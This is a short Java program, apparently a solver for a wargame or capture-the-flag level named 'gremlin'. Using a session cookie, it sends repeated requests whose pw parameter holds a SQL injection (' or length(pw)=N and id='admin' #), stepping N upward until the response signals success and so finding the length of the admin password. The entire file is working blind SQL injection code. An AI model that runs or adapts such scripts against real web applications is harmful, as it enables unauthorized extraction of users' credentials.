import java.io.*;
import java.util.*;
import java.net.*;

public class gremlin
extends BaseClass
{
@Override
public void run(){
		Configure conf = new Configure();
		if(conf.getToken().equals("exit")){
			return;
		}

		try{
			final String cookie_content = "PHPSESSID="+conf.getToken()+";";
			int pwlen=-1;
			String content="";
			int lenhelper = 40;
			while(pwlen==-1){
				String sub_query = "?"+String.format("pw=%%27%%20or%%20length(pw)=%d%%20%s%%23",lenhelper,URLEncoder.encode(" and id='admin' "));
				content=queryContent(conf,cookie_content,sub_query);
				
				if(isSuccess(content)){
					pwlen=(lenhelper);
					pwlen=lenhelper;
					
				}
				else{
					lenhelper++;
				}
			}
			
		}
		catch(Exception e){}
	}
public static void main(String... args){

		gremlin bi = new gremlin();
		Thread th = new Thread(bi);
		th.start();
		try{
			th.join();}catch(Exception e){}
		System.out.println("program finish");
	}
}
